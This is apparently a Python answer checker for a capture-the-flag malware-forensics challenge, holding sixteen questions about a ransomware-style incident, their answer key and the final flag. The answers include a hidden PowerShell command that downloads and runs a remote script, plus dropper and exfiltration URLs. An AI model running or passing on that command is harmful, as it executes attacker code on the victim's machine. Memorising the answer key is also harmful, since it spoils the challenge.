def main():
    questions = [
        {
            "question": "1. Username on the device infected with malware?",
            "format": "-"
        },
        { 
            "question": "2. Which folder is encrypted by the malware?",
            "format": "D:\\Example"
        },
        { 
            "question": "3. The threat actor's crypto wallet?",
            "format": "15cxezxyj3PxxNtoVAJ6rwiDYKnrchTNMm"
        },
        { 
            "question": "4. What applications do threat actors use to interact with victims?",
            "format": "-"
        },
        { 
            "question": "5. Victim's Discord ID?",
            "format": "1234567890"
        },
        { 
            "question": "6. Threat actor's Discord ID?",
            "format": "1234567890"
        },
        { 
            "question": "7. When did the threat actor join the same group as the victim?",
            "format": "DD/MM/YYYY"
        },
        { 
            "question": "8. The link containing initial loader that was sent by the threat actor to the victim?",
            "format": "http://example.com/example"
        },
        { 
            "question": "9. After the victim downloads and unzips the file, the malware file is moved to what folder?",
            "format": "D:\\Path\\To\\Example.txt"
        },
        { 
            "question": "10. What is the URL accessed by the initial dropper to download the second-stage loader?",
            "format": "https://example.com/example"
        },
        { 
            "question": "11. Where was the second-stage loader stored after being downloaded?",
            "format": "D:\\example.txt"
        },
        { 
            "question": "12. What repository does the threat actor use to develop the second-stage loader?",
            "format": "https://example.com/example"
        },
        { 
            "question": "13. What is the full PowerShell command executed by the second-stage loader?",
            "format": "-"
        },
        { 
            "question": "14. What URL does the final payload send the encrypted file to after encryption?",
            "format": "https://example.com/example"
        },
        { 
            "question": "15. What key was used by the final payload to encrypt the Downloads folder?",
            "format": "-"
        },
        { 
            "question": "16. Decrypt the .txt file located in the Downloads folder and input its contents!",
            "format": "-"
        }
    ]

    answers = [
        "Peacock",
        "C:\\Users\Peacock\\Downloads",
        "0xe28789577b1F8cfD964b2fD860807758216CeAE1",
        "Discord",
        "1391969554309058590",
        "1391972617149481050",
        "08/07/2025",
        "https://drive.google.com/file/d/1ZK-MED8DZcgsITflYMvWwAzYIlOFS7zu/view?usp=sharing",
        "C:\\Users\\Peacock\\Documents\\main.exe",
        "http://143.198.88.30:1338/installer.exe",
        "C:\\Windows\\Temp\\MkbrkEXh.exe",
        "https://github.com/Ne0nd0g/go-shellcode",
        "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://143.198.88.30:1338/o.ps1')",
        "https://webhook.site/5bdcd260-64f9-47d9-9fb5-1ef8146dc402",
        "IITTSSEECC_CTF2025Coyyyyy!!!!",
        "EzMalware_1337!!"
    ]

    print("Silahkan jawab pertanyaan-pertanyaan yang telah disediakan:")

    correct_answers = 0

    for index, q in enumerate(questions, start=1):
        print(f"\nNo {index}:")
        print("Pertanyaan: " + q["question"])
        print("Format: " + q["format"])
        user_answer = input("Jawaban: ")

        if user_answer.strip() == answers[index - 1]:
            correct_answers += 1
            print("Correct")
        else:
            print("Incorrect")
            return
    
    if correct_answers == len(questions):
        print("\nCongrats! Flag: ITSEC{b403ab3f9050c1de4485cbbb747bfc14}")

if __name__ == "__main__":
    main()